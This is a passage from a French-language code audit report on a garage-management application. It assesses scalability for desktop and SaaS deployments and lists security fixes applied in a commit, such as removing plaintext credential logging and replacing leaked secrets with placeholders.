**🟢 Priorité 4 — améliorations futures**
13. Supprimer code mort (modèles, `logLogin`), activer ESLint strict, tests API/e2e + `next build` en CI, monitoring (Sentry), rollback update, revue WCAG.

### Capacité de montée en charge

> Deux lectures selon la cible réelle du produit.

| Charge | En **desktop mono‑poste** (1 install = 1 garage, SQLite local) | En **SaaS multi‑tenant** sur la pile actuelle |
|--------|----------------------------------------------------------------|-----------------------------------------------|
| **100** | ✅ Oui. Chaque poste est indépendant ; SQLite local suffit largement. Le serveur central n'intervient que pour licences/updates. | 🟠 Marginal. SQLite mono‑writer + rate‑limit/session en mémoire tiennent mal la concurrence ; OK en pic très faible. |
| **1 000** | ✅ Oui, côté postes. ⚠️ Le **serveur de licences/updates** centralisé doit être dimensionné (mais charge faible). | 🔴 Non. Contention d'écriture SQLite, état non partagé entre instances. |
| **10 000** | ✅ Côté postes (indépendants). ⚠️ Backend licences à mettre sur Postgres + monitoring. | 🔴 Non. |
| **100 000** | 🟠 Postes OK, mais **distribution des updates** (bande passante, CDN) et licences deviennent un vrai backend à industrialiser. | 🔴 Non. |
| **1 000 000** | 🟠 Faisable **uniquement** avec un backend licences/updates repensé (Postgres/Redis/CDN/queue) et signature des mises à jour. Les postes eux‑mêmes restent indépendants. | 🔴 Non — refonte complète requise (Postgres, Redis, stockage objet, horizontal scaling, statelessness). |

**Justification :** l'architecture **desktop** scale « naturellement » (chaque client est isolé) tant que les services **centraux** (activation, révocation, mises à jour) sont portés sur une pile scalable et sécurisée — ce qui n'est **pas** le cas aujourd'hui (SQLite, secret partagé, updates non signées). L'architecture **SaaS** telle qu'esquissée (SQLite + état mémoire) ne dépasse pas quelques dizaines d'utilisateurs concurrents de façon fiable.

---

## 16. Corrections appliquées dans ce commit

> Corrections **sûres et non‑régressives** appliquées directement. Les autres (rotation de secrets, refonte updates, DB) nécessitent des décisions d'infrastructure et sont laissées à votre validation.

1. **`src/lib/auth.ts`** — suppression de la journalisation des identifiants en clair (C3), remplacée par un log minimal non sensible.
2. **`.env.example`** — secrets réels remplacés par des placeholders + consigne de génération (`openssl rand -base64 32`). ⚠️ **Le secret d'origine reste dans l'historique git et DOIT être tourné.**
3. **`keys/server_config.json`** — `api_key` réelle remplacée par un placeholder.
4. **`.gitignore`** — exclusion de `keys/*.json` et durcissement des règles `.env`.

Toutes les autres corrections sont fournies « prêtes à l'emploi » dans les sections ci‑dessus.
